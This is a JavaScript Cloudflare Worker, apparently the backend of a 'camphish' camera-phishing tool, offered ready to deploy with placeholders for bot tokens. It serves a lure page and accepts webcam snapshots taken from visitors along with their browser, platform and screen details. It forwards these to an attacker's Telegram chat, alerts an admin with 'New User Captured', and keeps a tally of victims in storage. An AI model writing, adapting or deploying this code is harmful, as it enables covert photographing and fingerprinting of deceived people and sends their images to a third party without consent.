// Cloudflare Worker for Telegram integration
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

// Configuration - REPLACE THESE!
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID_HERE'; // Optional

async function handleRequest(request) {
  const url = new URL(request.url);
  
  // CORS headers
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  };

  // Handle preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // API endpoint for capturing photos
  if (url.pathname === '/api/capture' && request.method === 'POST') {
    try {
      const data = await request.json();
      
      // Validate data
      if (!data.image || !data.timestamp) {
        return new Response(JSON.stringify({ error: 'Invalid data' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      // Send to Telegram
      const telegramResult = await sendToTelegram(data);
      
      // Log the capture
      await logCapture(data);
      
      return new Response(JSON.stringify({
        success: true,
        message: 'Image captured and sent',
        telegram: telegramResult
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
      
    } catch (error) {
      console.error('Capture error:', error);
      return new Response(JSON.stringify({ 
        error: 'Failed to process image',
        details: error.message 
      }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }

  // Status endpoint
  if (url.pathname === '/api/status') {
    return new Response(JSON.stringify({
      status: 'online',
      timestamp: new Date().toISOString(),
      service: 'camphish-worker'
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }

  // Default: serve the HTML page
  return fetch('https://raw.githubusercontent.com/YOUR_USERNAME/camphish/main/index.html');
}

// Send image to Telegram
async function sendToTelegram(data) {
  try {
    // Convert base64 to blob
    const base64Data = data.image;
    const binaryString = atob(base64Data);
    const bytes = new Uint8Array(binaryString.length);
    
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    
    const blob = new Blob([bytes], { type: 'image/jpeg' });
    
    // Create form data
    const formData = new FormData();
    formData.append('photo', blob, 'capture.jpg');
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    
    // Create caption with user info
    const caption = `📸 New Capture!\n` +
                   `🕒 Time: ${new Date(data.timestamp).toLocaleString()}\n` +
                   `🌐 Browser: ${data.userAgent || 'Unknown'}\n` +
                   `💻 Platform: ${data.platform || 'Unknown'}\n` +
                   `📱 Screen: ${data.screen || 'Unknown'}\n` +
                   `🔗 Worker: ${new Date().toISOString()}`;
    
    formData.append('caption', caption);
    
    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    
    // Send notification to admin
    if (ADMIN_CHAT_ID) {
      await sendAdminNotification(data);
    }
    
    return { ok: response.ok, result };
    
  } catch (error) {
    console.error('Telegram send error:', error);
    throw error;
  }
}

// Send admin notification
async function sendAdminNotification(data) {
  try {
    const message = `👤 New User Captured\n` +
                   `Time: ${new Date().toLocaleString()}\n` +
                   `User Agent: ${data.userAgent?.substring(0, 50) || 'Unknown'}`;
    
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message
      })
    });
    
  } catch (error) {
    console.error('Admin notification error:', error);
  }
}

// Log capture to KV storage (optional)
async function logCapture(data) {
  try {
    // If you have Cloudflare KV setup
    const CAPTURES = await CAMPHISH_KV.get('captures', 'json') || { count: 0, last: null };
    
    CAPTURES.count += 1;
    CAPTURES.last = new Date().toISOString();
    CAPTURES.last_user_agent = data.userAgent;
    
    await CAMPHISH_KV.put('captures', JSON.stringify(CAPTURES));
    
  } catch (error) {
    // KV not configured, just continue
    console.log('KV not configured, skipping log');
  }
}
